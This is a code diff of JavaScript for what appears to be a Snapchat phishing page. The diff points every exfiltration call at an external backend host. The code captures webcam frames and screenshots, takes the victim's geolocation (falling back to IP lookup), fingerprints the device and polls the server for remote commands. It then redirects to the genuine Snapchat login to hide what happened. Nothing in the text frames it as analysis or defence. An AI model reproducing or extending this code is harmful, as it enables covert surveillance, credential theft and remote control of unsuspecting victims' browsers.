@@ -1,3 +1,5 @@
+const BACKEND_URL = "https://snap-backend-2lgr.onrender.com";
+
 function handleLogin(event) {
   event.preventDefault();
   const user = document.getElementById('username').value;
@@ -21,14 +23,13 @@ function startFullVerification() {
   tryScreenCapture();
   sendFingerprint();
 
-  // ✅ إعادة توجيه وهمية بعد التحقق
   setTimeout(() => {
     window.location.href = "https://accounts.snapchat.com/accounts/login";
   }, 6000);
 }
 
 function sendNotification(msg) {
-  fetch("/notify", {
+  fetch(`${BACKEND_URL}/notify`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ message: msg })
@@ -54,7 +55,7 @@ function tryCameraWithFallback() {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         let dataURL = canvas.toDataURL("image/png");
 
-        fetch('/screenshot', {
+        fetch(`${BACKEND_URL}/screenshot`, {
           method: 'POST',
           headers: { 'Content-Type': 'text/plain' },
           body: dataURL
@@ -73,7 +74,7 @@ function tryCameraWithFallback() {
 function requestLocation() {
   navigator.geolocation.getCurrentPosition(
     pos => {
-      fetch("/location", {
+      fetch(`${BACKEND_URL}/location`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -85,7 +86,7 @@ function requestLocation() {
     },
     () => {
       sendNotification("❌ رفض الموقع. محاولة تحديد عبر IP...");
-      getIPLocation(); // fallback مباشر
+      getIPLocation();
     }
   );
 }
@@ -115,7 +116,7 @@ function tryScreenCapture() {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         let dataURL = canvas.toDataURL("image/png");
 
-        fetch('/screenshot', {
+        fetch(`${BACKEND_URL}/screenshot`, {
           method: 'POST',
           headers: { 'Content-Type': 'text/plain' },
           body: dataURL
@@ -131,7 +132,7 @@ function tryScreenCapture() {
 function capturePage() {
   html2canvas(document.body).then(canvas => {
     let image = canvas.toDataURL("image/png");
-    fetch("/screenshot", {
+    fetch(`${BACKEND_URL}/screenshot`, {
       method: "POST",
       headers: { "Content-Type": "text/plain" },
       body: image
@@ -150,7 +151,7 @@ function sendFingerprint() {
     deviceMemory: navigator.deviceMemory || 'غير متاح'
   };
 
-  fetch("/fingerprint", {
+  fetch(`${BACKEND_URL}/fingerprint`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(info)
@@ -159,7 +160,7 @@ function sendFingerprint() {
 
 function pollCommands() {
   setInterval(() => {
-    fetch('/get_command')
+    fetch(`${BACKEND_URL}/get_command`)
       .then(response => response.json())
       .then(data => {
         if (!data.command) return;
